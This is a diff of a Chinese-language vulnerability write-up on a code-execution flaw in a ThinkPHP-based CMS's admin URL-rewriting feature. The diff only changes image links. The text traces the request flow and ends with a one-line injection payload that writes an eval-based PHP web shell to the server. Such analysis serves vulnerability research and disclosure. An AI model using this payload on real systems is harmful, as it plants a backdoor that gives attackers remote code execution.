@@ -240,28 +240,31 @@ thinkphp目录
 
 当在后台【URL美化】功能中插入PHP代码保存后，重新访问该页面PHP代码会被执行，在public下创建11.php，导致产生代码执行漏洞。
 
-![图片9](E:\file\知识\安全服务交付\图片9.png)
+![图片9](https://user-images.githubusercontent.com/51915181/218089019-1cc8c8ea-b346-4f3b-a5ce-aae881bcc3ee.png)
 
 尝试抓包，看看我们在保存设置到最后执行PHP代码之间经历了什么
 
-![图片10](E:\file\知识\安全服务交付\图片10.png)
+![图片10](https://user-images.githubusercontent.com/51915181/218089078-e6a067a3-99e1-4d56-ae82-0cdcd3f17628.png)
 
 一共提交了两个请求，第一个请求提交到admin目录下route控制器中的editpost方法
 
-![图片11](E:\file\知识\安全服务交付\图片11.png)
+![图片11](https://user-images.githubusercontent.com/51915181/218089088-02c7196d-9c6b-46a9-88de-bcd003cf36cb.png)
+
 
 该方法是用来接收参数后更新到数据库。流程应该就是当某个URL地址被访问后，路由机制会从数据出中读取是否存在该URL的地址转发，如果有，则访问到相对应的路径。
 
-![图片12](E:\file\知识\安全服务交付\图片12.png)
+![图片12](https://user-images.githubusercontent.com/51915181/218089128-3dce90ee-0e10-432d-88f8-022edd12b747.png)
+
 
 第二个请求对route表中的数据排序后调用getRoutes方法
 
-![图片12](E:\file\知识\安全服务交付\图片13.png)
+![图片13](https://user-images.githubusercontent.com/51915181/218089164-83212295-b069-4d0f-b3fb-cd4ab7ceab5b.png)
 
 跟进getRoutes方法
 
-![图片15](E:\file\知识\安全服务交付\图片15.png)
+![图片15](https://user-images.githubusercontent.com/51915181/218089188-736c7bc8-dedf-47d0-9cc6-90f0c268df1c.png)
+
 
 最后构造payload:`'.file_put_contents('1.php','<?php @eval($_POST[1]); ?>').'`
 
-![图片16](E:\file\知识\安全服务交付\图片14.png)
+![图片14](https://user-images.githubusercontent.com/51915181/218089205-5c157f66-52af-4cf3-8ad9-f3b309b84662.png)
